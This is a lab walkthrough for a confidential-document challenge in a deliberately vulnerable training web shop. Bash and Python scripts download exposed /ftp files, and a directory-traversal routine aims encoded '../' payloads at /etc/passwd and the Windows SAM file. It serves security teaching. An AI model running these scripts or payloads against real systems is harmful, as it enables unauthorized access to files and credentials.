# Challenge 6: Confidential Document

## Difficulty: ⭐⭐ (2/5)

## Objective
Access a confidential document that should not be publicly accessible.

## Vulnerability
Directory traversal and improper access control on the FTP directory.

## Solution

### Method 1: Direct FTP Access
1. Navigate to: `https://[your-instance].wonkatech.org/ftp`
2. You'll see a directory listing
3. Look for `acquisitions.md` 
4. Click to download it

### Method 2: About Us Page
1. Go to "About Us" page
2. Check the URL when clicking on Terms of Use
3. Notice the pattern: `/ftp/legal.md`
4. Try accessing: `/ftp/acquisitions.md`

### Method 3: Directory Traversal
1. Find any link that accesses files
2. Modify the URL to include directory traversal
3. Access confidential files

## Automated Script:
```bash
#!/bin/bash
# save as: confidential_document.sh

TARGET="https://juice3.wonkatech.org"

echo "📂 Accessing Confidential Documents..."

# Check FTP directory
echo "Checking FTP directory..."
curl -s "${TARGET}/ftp/" | grep -o 'href="[^"]*"' | cut -d'"' -f2

# Try to access known confidential files
FILES=(
    "acquisitions.md"
    "coupons_2013.md.bak"
    "eastere.gg"
    "invoice_2016.pdf"
    "package.json.bak"
)

for file in "${FILES[@]}"; do
    echo "Trying: ${TARGET}/ftp/${file}"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/ftp/${file}")
    if [ "$STATUS" = "200" ]; then
        echo "✅ Found: ${file}"
        # Download the file
        curl -s "${TARGET}/ftp/${file}" -o "${file}"
        echo "📥 Downloaded to: ${file}"
    fi
done
```

## Python Automation:
```python
#!/usr/bin/env python3
# save as: challenge_06_confidential_document.py

import requests
from bs4 import BeautifulSoup

def find_confidential_documents(base_url):
    """Find and access confidential documents"""
    
    print(f"🎯 Challenge 6: Confidential Document on {base_url}")
    
    # Method 1: Check FTP directory
    print("\n📂 Checking FTP directory...")
    ftp_url = f"{base_url}/ftp"
    
    try:
        response = requests.get(ftp_url)
        if response.status_code == 200:
            print(f"✅ FTP directory accessible at: {ftp_url}")
            
            # Parse directory listing
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a')
            
            print("\n📁 Files found:")
            for link in links:
                href = link.get('href', '')
                if href and not href.startswith('/'):
                    print(f"  - {href}")
                    
                    # Check for confidential files
                    if 'acquisition' in href.lower() or 'confidential' in href.lower():
                        print(f"  ⚠️  CONFIDENTIAL: {href}")
                        
                        # Download the file
                        file_url = f"{base_url}/ftp/{href}"
                        file_response = requests.get(file_url)
                        if file_response.status_code == 200:
                            with open(href, 'wb') as f:
                                f.write(file_response.content)
                            print(f"  📥 Downloaded: {href}")
    
    except Exception as e:
        print(f"Error accessing FTP: {e}")
    
    # Method 2: Try known confidential files
    print("\n🔍 Trying known confidential files...")
    confidential_files = [
        "acquisitions.md",
        "coupons_2013.md.bak",
        "invoice_2016.pdf",
        "package.json.bak",
        "quarantine/juice-shop-malware.exe"
    ]
    
    for filename in confidential_files:
        file_url = f"{base_url}/ftp/{filename}"
        try:
            response = requests.head(file_url)
            if response.status_code == 200:
                print(f"✅ Found: {filename}")
                print(f"   URL: {file_url}")
        except:
            pass
    
    print("\n💡 The main target is 'acquisitions.md'")
    print(f"📎 Direct link: {base_url}/ftp/acquisitions.md")

if __name__ == "__main__":
    BASE_URL = "https://juice3.wonkatech.org"
    find_confidential_documents(BASE_URL)
```

## Directory Traversal Attempt:
```python
def try_directory_traversal(base_url):
    """Attempt directory traversal attacks"""
    
    traversal_payloads = [
        "../",
        "..\\",
        "../../../",
        "%2e%2e%2f",
        "..%2f",
        "%252e%252e%252f"
    ]
    
    target_files = [
        "etc/passwd",
        "windows/system32/config/sam",
        "var/log/apache2/access.log"
    ]
    
    for payload in traversal_payloads:
        for target in target_files:
            url = f"{base_url}/ftp/{payload}{target}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and len(response.content) > 0:
                    print(f"⚠️  Possible traversal: {url}")
            except:
                pass
```

## Learning Points
- FTP directories should not be publicly accessible
- Sensitive documents need proper access controls
- Directory listings should be disabled in production
- File extensions like `.bak` often contain sensitive data